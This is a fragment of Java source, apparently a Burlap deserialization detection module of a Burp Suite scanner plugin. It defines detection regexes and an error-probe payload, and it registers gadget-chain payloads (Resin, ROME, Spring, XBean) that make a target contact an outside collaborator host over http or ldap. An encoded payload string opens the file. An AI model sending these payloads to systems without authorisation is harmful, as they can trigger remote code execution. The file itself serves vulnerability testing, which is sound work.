ewKO0R3kw3URDepQJkLUBy/vr+5BdFJvmdcBGZj5CE9m17XF/Telnag1zo1blrSpz+NeyvRQtWdWZb6Xs1bPKWNnv5gVydYcOQjwVxSqTBfXk72i20FPIF9nhcbMo0i+MaSiaWElJjT0PO9EKTUH5RuVkyiWVKKUjvcZ8Fer+HrtPxr+Z7KfWoi9GrJshgZNNbyOZN4QslwndzIJZ4M4/5W+4dRkOcmmu9A2OAPWwV2QU5AISwkDEZFU0jbivLku15sXam/mOs1Zi7nk7vhpwpjPOOyRjBe1URodUDLKOdUN2qrWBW+ciCB3hvYrZms2DBfVMzuMCDqLvK6QyC3s8vVYrTCrgPTqheUX6ZdhuGRzjEDrR23Tcp+6fFE9SYR5k6F19+9N25Xn2SXX5bF1lQTWYlR0Bou5waX");


    protected void initialiseModule() {
        setName("Burlap");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(Pattern.compile("((<)|(%3C)|(%3c))map((>)|(%3E)|(%3e))((<)|(%3C)|(%3c))type((>)|(%3E)|(%3e))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("com.caucho.burlap.io.BurlapProtocolException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<FreddyDeser></FreddyDeser>", Pattern.compile("Unknown tag ((<)|(&lt;))FreddyDeser((>)|(&gt;))"));

        registerActiveScanCollaboratorPayload(PN_RESIN, false);
        registerActiveScanCollaboratorPayload(PN_ROME, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, false);
        registerActiveScanCollaboratorPayload(PN_XBEAN, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_RESIN:
                return RESIN_PREFIX + "http://" + hostname + "/" + RESIN_SUFFIX;

            case PN_ROME:
                return ROME_PREFIX + "ldap://" + hostname + "/" + ROME_SUFFIX;

            case PN_SPRINGABF:
                return SABF_PREFIX + "ldap://" + hostname + "/" + SABF_MIDDLE + "ldap://" + hostname + "/" + SABF_SUFFIX;

            case PN_SPRINGPCA:
                return SPCA_PREFIX + "ldap://" + hostname + "/" + SPCA_MIDDLE + "ldap://" + hostname + "/" + SPCA_SUFFIX;

            case PN_XBEAN:
                return XBEAN_PREFIX + "http://" + hostname + "/" + XBEAN_SUFFIX;
        }
        return null;
    }
}
